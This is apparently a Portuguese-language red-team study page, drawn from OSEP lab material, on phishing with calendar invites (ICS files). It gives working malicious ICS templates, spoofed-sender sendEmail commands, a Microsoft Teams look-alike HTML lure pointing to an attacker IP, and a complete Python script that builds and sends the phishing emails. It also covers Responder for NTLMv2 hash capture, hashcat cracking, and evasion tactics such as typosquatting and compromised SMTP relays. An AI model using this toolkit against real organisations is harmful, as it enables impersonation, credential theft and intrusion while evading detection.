---
layout: cyber
section: acesso-inicial
title: "Phishing via Convite de Calendário (ICS) — Vetor de Acesso Inicial"
---

# Phishing via Convite de Calendário (ICS) — Vetor de Acesso Inicial

## Convites de Calendário Passam Pelos Filtros

Filtros de email tradicionais focam em anexo executável e link suspeito no corpo. Arquivos `.ics` são tratados como dados de calendário legítimos por Outlook, Google Calendar e Apple Calendar — canal de entrega com baixa taxa de bloqueio. Campanhas reais documentadas demonstram três frentes: entrega de link de phishing que passa por filtro de URL, captura de hashes NTLMv2 via caminho UNC embutido no campo `DESCRIPTION`, e engenharia social com alta credibilidade (imitando convite de Microsoft Teams, Zoom, etc.). MITRE ATT&CK: T1566.001 (Spearphishing Attachment) e T1187 (Forced Authentication).

---

## 1. Formato iCalendar (ICS) — Visão Geral

O padrão iCalendar é definido pela **RFC 5545** (IETF) e representa dados de calendário em texto
simples. Qualquer cliente de e-mail moderno sabe interpretar e exibir convites `.ics` de forma
visual, tornando o ataque transparente para o usuário.

### Estrutura Geral

```
BEGIN:VCALENDAR
  PRODID:...          <- Identifica o software que gerou o arquivo
  VERSION:2.0
  CALSCALE:GREGORIAN
  METHOD:REQUEST      <- Indica que é um convite (importante!)
  BEGIN:VTIMEZONE ... END:VTIMEZONE
  BEGIN:VEVENT
    ...campos do evento...
  END:VEVENT
END:VCALENDAR
```

### Campos Principais do VEVENT

| Campo | Descrição | Relevância Ofensiva |
|-------|-----------|---------------------|
| `ORGANIZER` | Nome e e-mail do organizador | Falsificar como RH, TI, CEO |
| `DTSTART` | Data/hora de início | Usar horário comercial para credibilidade |
| `DTEND` | Data/hora de fim | Duração típica (1h) aumenta legitimidade |
| `DESCRIPTION` | Descrição textual do evento | **Vetor principal**: links de phishing ou caminhos UNC |
| `SUMMARY` | Título/assunto do evento | "Reunião Urgente de RH", "Atualização Salarial" |
| `UID` | Identificador único do evento | Gerado aleatoriamente para parecer distinto |
| `LOCATION` | Local do evento | "Microsoft Teams Meeting" aumenta credibilidade |
| `ATTENDEES` | Lista de participantes | Adicionar CEOs/CTOs como participantes falsos |
| `STATUS` | Estado do evento | `CONFIRMED` para aparência de legitimidade |

### Exemplos de Campos Individuais

**ORGANIZER:**
```
ORGANIZER;CN="Maria Silva - RH":mailto:rh@corp.com
```

**Datas (formato UTC):**
```
DTSTART;TZID=UTC:20241015T090000Z
DTEND;TZID=UTC:20241015T100000Z
```

**DESCRIPTION com link malicioso:**
```
DESCRIPTION:http://portal-teams.corp-fake.com/join?id=12345
```

**DESCRIPTION com caminho UNC (captura de hash):**
```
DESCRIPTION:\\192.168.251.151\share\meeting-materials
```

---

## 2. Criando um Arquivo ICS Malicioso

### Template ICS Básico (do curso OSEP)

```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

### Observações Táticas por Campo

- **`PRODID: Microsoft Exchange Server 2022`** — faz o arquivo parecer gerado por Exchange legítimo
- **`METHOD: REQUEST`** — instrui o cliente de e-mail a exibir botões "Aceitar / Recusar"
- **`UID`** único por mensagem — impede deduplicação e ajuda a bypass de filtros
- **`DTSTAMP`** e **`DTSTART`** devem estar em horário comercial do fuso-alvo

---

## 3. Enviando com sendEmail

O `sendEmail` é uma ferramenta CLI disponível no Kali para envio de e-mails via SMTP arbitrário.

### Sintaxe Básica

```bash
sendEmail -s <smtp_server> \
          -t <destinatario> \
          -f <remetente_falso> \
          -u "<assunto>" \
          -o message-content-type=html \
          -o message-file=./template.html \
          -a iCalendar.ics
```

### Exemplo do Lab OSEP

```bash
# Primeiro envio — teste simples
sendEmail -s 192.168.50.121 \
          -t offsec@corp1.com \
          -f attacker@corp1.com \
          -u "test" \
          -o message-content-type=html \
          -o message-file=./template.html \
          -a iCalendar.ics

# Segundo envio — versão com template Teams
sendEmail -s 192.168.50.121 \
          -t offsec@corp1.com \
          -f attacker@corp1.com \
          -u "Urgent HR meeting" \
          -o message-content-type=html \
          -o message-file=./email.html \
          -a iCalendar.ics
```

**Saída esperada:**
```
Oct 10 04:14:23 kali sendEmail[825871]: Email was sent successfully!
```

### Parâmetros Importantes

| Flag | Significado |
|------|-------------|
| `-s` | Servidor SMTP (ex: mail relay interno sem autenticação) |
| `-t` | Destinatário(s) — suporta lista separada por vírgula |
| `-f` | Remetente falsificado (spoofing) |
| `-u` | Assunto do e-mail |
| `-o message-content-type=html` | Define o corpo como HTML |
| `-o message-file=./arquivo.html` | Arquivo HTML do corpo |
| `-a` | Anexo (o arquivo .ics) |

---

## 4. Template HTML Imitando Microsoft Teams

O campo `href` de cada link deve conter o IP/domínio do atacante ou a URL de phishing.

### Template Simples (teste inicial)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <p>Hello,</p>
    <p>This is a test email</p>
    <p>Best regards,<br>Attacker</p>
</body>
</html>
```

### Template Avançado — Imitação Real do Microsoft Teams

Copiar o layout original do Teams e substituir todos os `href` por `[ATTACKER_URL]`:

```html
<p class=MsoNormal style='background:white'>
  <span style='color:black'>
    We are reaching out to inform you of an urgent meeting scheduled by the HR
    Department that requires your immediate attention.
  </span>
</p>

<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    ________________________________________________________________________________
  </span>
</p>

<p class=MsoNormal style='background:white'>
  <span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>
    Microsoft Teams meeting
  </span>
</p>

<p class=MsoNormal style='background:white'>
  <b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>
    Join on your computer or mobile app
  </span></b>
</p>

<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif; color:#252424'>
    <a href="http://192.168.251.151" target="_blank">
      <span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>
        Click here to join the meeting
      </span>
    </a>
  </span>
</p>

<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif; color:#252424'>
    <a href="https://aka.ms/JoinTeamsMeeting" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Learn More</span>
    </a> |
    <a href="http://192.168.251.151" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Meeting options</span>
    </a>
  </span>
</p>

<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    <span style='opacity:.36'>________________________________________________________________________________</span>
  </span>
</p>
```

**Nota:** Em um engajamento real, substituir IPs por domínios de typosquatting:
- `corp1.com` -> `c0rp1.com`, `corp-1.com`, `corp1-hr.com`
- Usar certificados TLS válidos (Let's Encrypt) para evitar alertas de HTTPS

---

## 5. Script Python de Automação — fakeics.py

Automatiza a geração de ICS + HTML e o envio, tornando a campanha escalável.

### Uso

```bash
python3 fakeics.py <smtp_server> <sender_email> <recipient_email> <event_url>

# Exemplo do lab:
python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151
```

### Código Completo Comentado

```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate

# ============================================================
# CONFIGURAÇÕES — ajustar por campanha
# ============================================================
EMAIL_SUBJECT = "HR Meeting"
EVENT_SUMMARY = "HR meeting"
ORGANIZER_NAME = "HR Team Corp1"

# Participantes falsos adicionados ao convite (aumenta credibilidade)
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

# Corpo do e-mail — texto contextual para a pretextagem
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent
company-wide changes and policies. Your attendance is highly encouraged as
we will be discussing essential updates that impact all employees.

Topics will include:
- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions
or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""


def load_template():
    """Carrega o template HTML do corpo do e-mail."""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        return f.read()


def load_ics():
    """Carrega o template ICS."""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        return f.read()


def prepare_template(event_url):
    """Substitui placeholders no template HTML."""
    email_template = load_template()
    return email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)


def generate_attendees():
    """Gera entradas ATTENDEE formatadas para o ICS."""
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;"
            "PARTSTAT=ACCEPTED;RSVP=FALSE\r\n"
            " ;CN={a};X-NUM-GUESTS=0:\r\n"
            " mailto:{a}".format(a=attendee)
        )
    return "\r\n".join(attendees)


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    """Preenche o template ICS com dados dinâmicos."""
    ics_template = load_ics()
    return ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,      # URL de phishing ou caminho UNC
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )


def send_email(smtp_server, sender_email, to, event_url):
    print('[*] Enviando para: ' + to)

    # Calcula timestamps em UTC
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # reunião "já começou"
    duration = datetime.timedelta(hours=1)
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration

    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    # Constrói mensagem MIME
    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    # Anexo ICS
    ics_atch = MIMEBase('application/ics', ' ;name="invite.ics"')
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="invite.ics"')

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    # Envia via SMTP (porta 25, sem autenticação)
    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()
    print('[+] E-mail enviado com sucesso!')


def main():
    if len(sys.argv) != 5:
        print("Uso: python3 fakeics.py <smtp> <remetente> <destinatario> <url>")
        sys.exit(1)
    send_email(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])


if __name__ == "__main__":
    main()
```

### Template ICS com Placeholders (iCalendar_template.ics)

```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

---

## 6. Roubo de Credenciais via Caminho UNC + Responder

### Conceito

Quando o campo `DESCRIPTION` do ICS contém um caminho UNC (`\\IP\share`), clientes Windows
tentam autenticar automaticamente ao abrir o convite (ou ao clicar no link). O Responder
intercepta essa autenticação e captura o hash **NTLMv2**.

### Passo 1 — Iniciar o Responder

```bash
sudo responder -I tun0
```

Saída esperada:
```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]

[+] Listening for events...
```

### Passo 2 — Enviar o Phishing com URL Apontando para o Kali

```bash
python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151
```

O Responder responde à requisição HTTP com um desafio NTLM, capturando o hash:

```
[HTTP] NTLMv2 Client   : 192.168.50.120
[HTTP] NTLMv2 Username : CORP1\offsec
[HTTP] NTLMv2 Hash     : offsec::CORP1:1a04951d4c1f9296:BB96D8B827...
```

### Passo 3 — Salvar e Quebrar o Hash com Hashcat

```bash
# Salvar o hash completo em um arquivo
echo 'offsec::CORP1:b0473ae7fc387b68:26E980FE...' > hash.txt

# Quebrar com hashcat (modo 5600 = NetNTLMv2)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Exemplo de saída bem-sucedida:**
```
OFFSEC::CORP1:b0473ae7fc387b68:...:lab
Status........: Cracked
Hash.Mode.....: 5600 (NetNTLMv2)
```

### Como o Responder Funciona Nesse Contexto

O Responder explora mal configurações nos protocolos de resolução de nomes:
- **LLMNR** (Link-Local Multicast Name Resolution)
- **NBT-NS** (NetBios Name Service)
- **mDNS** (Multicast DNS)

Quando a vítima tenta acessar um recurso inexistente (como `\\192.168.251.151\share`),
o Responder intercepta a requisição e apresenta um prompt falso de autenticação, capturando
as credenciais no formato NTLMv2.

---

## 7. Fluxo de Ataque Completo

```
[Atacante]                          [Vítima]                    [Rede]
    |                                   |                           |
    |-- Cria iCalendar.ics ------------>|                           |
    |-- Cria email.html (Teams) ------->|                           |
    |-- Inicia Responder (tun0) ------->|                    [Responder ON]
    |                                   |                           |
    |-- python3 fakeics.py ------------>|                           |
    |   smtp / hr@corp1.com             |                           |
    |   offsec@corp1.com               |                           |
    |   http://192.168.251.151         |                           |
    |                                   |                           |
    |                   [Thunderbird mostra convite Teams]          |
    |                                   |                           |
    |                   [Clica "Click here to join"]               |
    |                                   |-- HTTP GET --> 192.168.251.151
    |                                   |<-- NTLM Challenge --[Responder]
    |                                   |-- NTLM Response (hash) -->|
    |                                   |                           |
    |<-- [Hash NTLMv2 capturado] ----------------------------[Responder]
    |                                   |                           |
    |-- hashcat -m 5600 hash.txt rockyou.txt                       |
    |-- SENHA EM TEXTO CLARO ----------------------------------------|
```

---

## 8. Considerações de OPSEC

### Domínios e Infraestrutura

- **Nunca usar IPs diretos em produção** — usar domínios registrados com certificado TLS válido
- **Typosquatting**: `corp1-hr.com`, `corp1-teams.com`, `c0rp1.com`
- Registrar domínios pelo menos 30 dias antes do engajamento (evitar filtros de reputação)
- Usar categorização de domínio: registrar em categorias como "Business" ou "Software"

### E-mail e Entrega

- Configurar **SPF**, **DKIM** e **DMARC** no domínio de phishing
- Usar um relay SMTP comprometido ou serviço de e-mail legítimo quando possível
- O campo `PRODID` deve corresponder ao software que a empresa-alvo realmente usa
- Testar o arquivo `.ics` em uma caixa de e-mail de teste antes de enviar em massa

### Timing e Pretext

- Enviar durante horário comercial do fuso-alvo (8h–11h são os horários de maior abertura)
- Eventos "urgentes" de RH têm alta taxa de clique — mas também alta taxa de reporte
- Usar nomes de organizadores plausíveis (verificar LinkedIn antes)

### Detecção e Evasão

| Indicador de Detecção | Contramedida |
|-----------------------|--------------|
| ICS vindo de domínio externo | Usar relay SMTP interno comprometido |
| URL no DESCRIPTION não corresponde ao domínio do organizador | Usar domínio de typosquatting coerente |
| Responder gerando tráfego LLMNR/NBT-NS | Usar apenas HTTP para captura (menos ruído) |
| Hash NTLMv2 em logs de proxy | Exfiltrar por HTTPS |

### Após a Captura

- Hash NTLMv2 **não pode ser usado diretamente** em Pass-the-Hash (apenas NTLMv1/NTLM)
- Tentar quebrar com hashcat + wordlist customizada para o setor da empresa
- Se não quebrar: tentar relay NTLM (ntlmrelayx.py) em vez de captura

---

## 9. Referências Cruzadas

| Tema | Módulo |
|------|--------|
| LLMNR/NBT-NS Poisoning | `06_movimentacao_lateral/responder_relay.md` |
| Pass-the-Hash após quebra | `09_active_directory/03_lateral_movement.md` |
| Typosquatting e infraestrutura | `02_reconhecimento/04_infra_phishing.md` |
| Phishing via macro Office | `03_acesso_inicial/03_macro_office.md` |

---

## 10. Checklist de Execução

```
[ ] Servidor SMTP acessível (ou relay comprometido)
[ ] Domínio de phishing registrado e categorizado
[ ] Certificado TLS válido no servidor de C2
[ ] SPF/DKIM/DMARC configurados no domínio de phishing
[ ] Template ICS testado no cliente de e-mail alvo
[ ] Template HTML visualmente idêntico ao legítimo
[ ] Responder iniciado na interface correta (-I tun0)
[ ] fakeics.py executado com argumentos corretos
[ ] Hash capturado salvo em hash.txt
[ ] hashcat executando em background
```
